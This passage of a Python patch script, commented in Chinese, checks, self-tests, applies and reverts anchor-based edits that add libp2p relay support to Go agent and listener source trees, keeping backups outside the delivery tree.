        t = M[key]
        hit = True
        for old, new in pairs:
            if t.count(old) != 1:
                print("  [FAIL] 破坏样本「%s」锚点命中 %d 次（应为 1）⇒ 自证不成立"
                      % (desc, t.count(old)))
                hit = False
                break
            t = t.replace(old, new)
        if not hit:
            allok = False
            continue
        M[key] = t
        got = run_checks(M)
        if got[idx][1]:
            print("  [FAIL] 破坏「%s」之后判据仍绿 ⇒ 该判据没有判别力" % desc)
            allok = False
        else:
            print("  [ok  ] 破坏「%s」⇒ 判据 %d 变红" % (desc, idx))
    return allok


def state(T):
    """整份改动的三态：old（一处都没打）/ done（全打了）/ ???（中间态）。

    ★ 必须**先看 new 再看 old**：有一类改动是"在 old 后面追加"（往 axLibp2pHost 里
    插 AddrsFactory、往 Create 里插组合地址…），这类改动的 old 文本在施加之后
    **依然存在**（它是 new 的前缀）⇒ 先看 old 的话，一棵完全施加好的树会被判成
    "未打=5"，`verify` 于是在目标态上报 FAIL。这是本脚本在副本上 apply 之后
    跑 verify 时实测到的 —— 判据的读取顺序本身就是判据的一部分。
    """
    n_old = n_new = n_bad = 0
    for path, pairs in EDITS:
        t = T[KEYOF[path]]
        for old, new in pairs:
            if t.count(new) == 1:
                n_new += 1
            elif t.count(old) == 1:
                n_old += 1
            else:
                n_bad += 1
    tail = "axLibp2pReserveLoop" in T["ll2p"]
    total = sum(len(p) for _f, p in EDITS)
    if n_new == total and tail:
        return "done", n_old, n_new, n_bad
    if n_new == 0 and not tail:
        return "old", n_old, n_new, n_bad
    return "???", n_old, n_new, n_bad


def bak(path):
    """回滚点路径。★ 批次6：放 BAKDIR（**交付树之外**），命名 = `<树>.<相对路径>.<后缀>`，
    沿用 /root/gp5probe/bak/ 里既有的约定（如 `gopher_listener_tcp.pl_main.go.orig`）。
    ★ 只用 basename 会撞车：`gopher_agent/pl_main.go` 与 `gopher_listener_tcp/pl_main.go`
    都真实存在；带上树名与相对路径才是无歧义的。
    """
    rel = os.path.relpath(path, os.path.dirname(LST))
    return os.path.join(BAKDIR, rel.replace(os.sep, ".") + BAK)


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "check"
    T = load()
    if T is None:
        print("RESULT: FAIL")
        return 2
    s, n_old, n_new, n_bad = state(T)
    print("[%-4s] 批次5 relay：锚点 未打=%d 已打=%d 异常=%d" % (s, n_old, n_new, n_bad))

    if mode == "selftest":
        ok = selftest(T)
        print("RESULT: %s（判据自证）" % ("PASS" if ok else "FAIL"))
        return 0 if ok else 1

    if mode == "check":
        if s == "???":
            print("       ★ 部分施加 —— 必须人工确认后再决定 apply 还是 revert")
            print("RESULT: FAIL")
            return 1
        print("RESULT: %s" % ("PASS（已是目标态）" if s == "done" else "PASS（待施加）"))
        return 0

    if mode == "verify":
        ok = selftest(T)
        res = run_checks(T)
        for name, good in res:
            print("  [%-4s] %s" % ("ok" if good else "BAD", name))
        bad = [n for n, g in res if not g]
        if s != "done":
            print("  [BAD ] 不是目标态（%s）" % s)
        good = ok and s == "done" and not bad
        print("RESULT: %s（%d/%d 项）" % ("PASS" if good else "FAIL",
                                          len(res) - len(bad), len(res)))
        return 0 if good else 1

    if mode == "apply":
        if s == "done":
            print("[done] 已是目标态，未改动")
            print("RESULT: PASS")
            return 0
        if s != "old":
            print("[BAD ] 部分施加 ⇒ 拒绝落盘（先 revert 或人工确认）")
            print("RESULT: FAIL")
            return 1
        # ★ 全部锚点先在内存里验一遍再动手：一个都不写，胜过写一半。
        try:
            M = applied(T)
        except AssertionError as e:
            print("[BAD ] %s ⇒ 拒绝落盘" % e)
            print("RESULT: FAIL")
            return 1
        for path, _pairs in EDITS:
            if not os.path.exists(bak(path)):
                shutil.copy2(path, bak(path))
            open(path, "w", encoding="utf-8", newline="\n").write(M[KEYOF[path]])
            print("  [ok  ] 写入 %s（回滚点 %s）"
                  % (os.path.basename(path), os.path.basename(bak(path))))
        print("RESULT: PASS")
        return 0


    if mode == "revert":
        if s == "old":
            print("[done] 本来就是原始态，未改动")
            print("RESULT: PASS")
            return 0
        for path, _pairs in EDITS:
            if not os.path.exists(bak(path)):
                print("[BAD ] 缺回滚点 %s ⇒ 无法回滚" % bak(path))
                print("RESULT: FAIL")
                return 1
        for path, _pairs in EDITS:
            shutil.copy2(bak(path), path)
            print("  [ok  ] 还原 %s" % os.path.basename(path))
        print("RESULT: PASS")
        return 0

    print("[BAD ] 未知模式 %r" % mode)
    print("RESULT: FAIL")
    return 2


def entry():
    try:
        return main()
    except KeyboardInterrupt:
        print("\nRESULT: FAIL（被中断）")
        return 130
    except Exception:
        import traceback
        traceback.print_exc()
        print("\nRESULT: FAIL（脚本异常，见上方 traceback）")
        return 1


if __name__ == "__main__":
    sys.exit(entry())
